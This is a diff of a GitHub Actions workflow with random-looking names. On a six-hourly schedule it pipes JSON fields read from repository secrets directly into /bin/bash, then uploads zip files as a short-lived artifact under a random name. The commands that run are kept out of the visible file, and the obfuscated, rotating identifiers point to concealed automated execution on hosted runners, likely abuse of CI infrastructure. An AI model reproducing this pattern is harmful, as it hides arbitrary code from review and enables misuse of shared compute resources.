@@ -1,32 +1,26 @@
 name: yuanliangwangnan
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '46 0/6 * * *'
-jobs:  # 1235
+    - cron: '49 1,7,13,19 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yuanliangwangnan
         env:
-          dz7: ${{ secrets.dz7 }}
+          n01557: ${{ secrets.n01557 }}
         run: |
-          echo $dz7 | jq -r .w965 | /bin/bash
-          echo $x7 | jq -r .tit38309 | /bin/bash
-          echo $czhxh8 | jq -r .xmn52 | /bin/bash
-          echo $xix3676 | jq -r .ydb53290 | /bin/bash
-          echo $ag479 | jq -r .waqq976 | /bin/bash
-          echo $rsvd87174 | jq -r .xqxgx4 | /bin/bash
-          echo $z0 | jq -r .w66078 | /bin/bash
-          echo $tggwg58907 | jq -r .iitx17 | /bin/bash
-          echo $x0336 | jq -r .lgfl29 | /bin/bash
-          echo $qxnz5 | jq -r .ntge78509 | /bin/bash
-          echo $lb81 | jq -r .zvwx83484 | /bin/bash
-          echo $hvb134 | jq -r .o02598 | /bin/bash
-          echo $jkn388 | jq -r .vuqr9578 | /bin/bash
-          echo $zydhg9277 | jq -r .b6 | /bin/bash
-          echo $ha516 | jq -r .bbw4 | /bin/bash
-          echo $ne978 | jq -r .cmhee25297 | /bin/bash
+          printf '%s' "$n01557" | jq -r .fcr5 | /bin/bash
+          printf '%s' "$k273" | jq -r .tsmfj95315 | /bin/bash
+          echo $klunj94071 | jq -r .o0 | /bin/bash
+          printf '%s' "$usqr96725" | jq -r .tf87 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: L9dRvlVm
+          path: "*.zip"
+          retention-days: 1
